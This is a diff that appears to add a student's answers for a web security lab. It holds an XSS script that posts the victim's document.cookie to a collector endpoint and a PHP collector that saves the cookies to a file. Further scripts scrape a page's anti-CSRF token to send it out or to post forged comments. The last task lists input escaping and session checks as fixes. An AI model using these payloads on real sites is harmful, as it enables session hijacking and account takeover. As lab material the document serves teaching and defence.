@@ -1,0 +1,132 @@
+--------------------------------------------------------------------------------------------------------
+Task 2
+--------------------------------------------------------------------------------------------------------
+
+        comments.php       -> authenticated
+        index.php          -> pre-authenticated
+        hiddenContent.php  -> pre-authenticated
+        search.php         -> pre-authenticated
+        login.php	   -> pre-authenticated
+	search.php	   -> pre-authenticated
+
+--------------------------------------------------------------------------------------------------------
+Task 4
+--------------------------------------------------------------------------------------------------------
+
+
+                               --------------------------------------------------------------------------------------------------------
+                                Send cookies
+                                --------------------------------------------------------------------------------------------------------
+                                <script>
+                                let dat = new FormData(); 
+                                dat.append("data", document.cookie);    
+                                fetch("http://127.0.0.1:8000/data.php", {   
+                                        method: "post",
+                                        body: dat,
+                                    })
+                                </script>
+                                
+                                    
+                                --------------------------------------------------------------------------------------------------------
+                                Save cookies in server
+                                --------------------------------------------------------------------------------------------------------
+                                <?php
+                                header('Access-Control-Allow-Origin: *');  
+                                $file_cookies = 'cookies.txt';
+                                $data = $_POST['data']; 
+                                if (isset($data))  
+                                {
+                                   $file_handle = fopen($file_cookies, 'a+'); 
+                                   fwrite($file_handle,$data."\n");  
+                                   fclose($file_handle);
+                                }
+                                ?>
+
+
+--------------------------------------------------------------------------------------------------------
+Task 5
+--------------------------------------------------------------------------------------------------------
+
+--------------------------------------------------------------------------------------------------------
+                                POST REQUEST REPLAY 
+                                --------------------------------------------------------------------------------------------------------
+
+comment=
+<script>alert('asdf');</script>&token256=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+
+                                                  --------------------------------------------------------------------------------------------------------
+                                Save tokens in server
+                                --------------------------------------------------------------------------------------------------------
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+<script>
+let contenidocomments ="";
+$.get("comments.php", function(htmlexterno){
+        contenidocomments = htmlexterno;
+        parser = new DOMParser();
+        doc = parser.parseFromString(contenidocomments, "text/html");
+        const token = doc.querySelector("[name=token256]").value;
+        let dat = new FormData();
+        dat.append("data", token); 
+        fetch("http://127.0.0.1:8000/data.php", {
+        method: "post",
+        body: dat,
+        })
+});
+</script>
+
+--------------------------------------------------------------------------------------------------------
+                                XSS COMMENT ATTACK
+                                --------------------------------------------------------------------------------------------------------
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+<script>
+let contenidocomments ="";
+let token = "";
+let comentario = "<h1>Este es el comentario enviado desde search</h1>";
+$.get("comments.php", function(htmlexterno){
+        contenidocomments = htmlexterno;
+        parser = new DOMParser();
+        doc = parser.parseFromString(contenidocomments, "text/html");
+        token = doc.querySelector("[name=token256]").value;
+        let dat = new FormData();
+        dat.append("comment", comentario);
+        dat.append("token256", token); 
+        fetch("comments.php", {
+        method: "post",
+        body: dat,
+        })
+});
+</script>
+
+
+
+
+--------------------------------------------------------------------------------------------------------
+Task 6
+--------------------------------------------------------------------------------------------------------
+
+// login.php
+$username = SQLite3::escapeString($_POST["username"]);   // SKIPS SPECIAL CHARACTERS
+$password = SQLite3::escapeString($_POST["password"]);   // SKIPS SPECIAL CHARACTERS
+
+// comments.php
+htmlentities($_POST['comment'])  // COVERT TO 
+
+// search.php
+$q = SQLite3::escapeString($_GET['q']); // SKIPS SPECIAL CHARACTERS
+htmlentities($_GET['q'])                //  ENCODE TO HTML ENTITIES
+
+
+ session_start();   // AUTHENTICATE PAGES
+
+    
+    if(!isset($_SESSION['login'])) {
+         echo "<h2>You must be logged in to access the search page</h2>";
+    
+    }else {
+    
+
+
+
